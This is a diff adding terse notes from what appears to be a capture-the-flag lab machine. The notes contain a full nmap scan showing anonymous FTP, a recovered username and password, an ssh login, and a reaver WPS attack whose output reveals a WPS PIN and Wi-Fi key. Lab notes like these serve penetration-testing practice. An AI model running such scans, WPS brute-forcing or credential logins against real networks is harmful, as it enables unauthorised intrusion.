@@ -1,0 +1,48 @@
+└─$ nmap -A 10.10.11.247 -p 1-65535 -T5 -Pn
+Starting Nmap 7.93 ( https://nmap.org ) at 2024-07-16 14:09 CEST
+Nmap scan report for 10.10.11.247
+Host is up (0.040s latency).
+Not shown: 65532 closed tcp ports (conn-refused)
+PORT   STATE SERVICE    VERSION
+21/tcp open  ftp        vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| -rw-r--r--    1 ftp      ftp          4434 Jul 31  2023 MigrateOpenWrt.txt
+| -rw-r--r--    1 ftp      ftp       2501210 Jul 31  2023 ProjectGreatMigration.pdf
+| -rw-r--r--    1 ftp      ftp         60857 Jul 31  2023 ProjectOpenWRT.pdf
+| -rw-r--r--    1 ftp      ftp         40960 Sep 11  2023 backup-OpenWrt-2023-07-26.tar
+|_-rw-r--r--    1 ftp      ftp         52946 Jul 31  2023 employees_wellness.pdf
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.10.14.5
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 4
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
+|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
+|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
+53/tcp open  tcpwrapped
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+netadmin
+VeRyUniUqWiFIPasswrd1!
+
+ssh 10.10.11.247 -l netadmin
+
+reaver -i mon0 -b 02:00:00:00:00:00 -vv -c 1
+[+] WPS PIN: '12345670'
+[+] WPA PSK: 'WhatIsRealAnDWhAtIsNot51121!'
+[+] AP SSID: 'OpenWrt'
+[+] Nothing done, nothing to save.
+
+
+
+
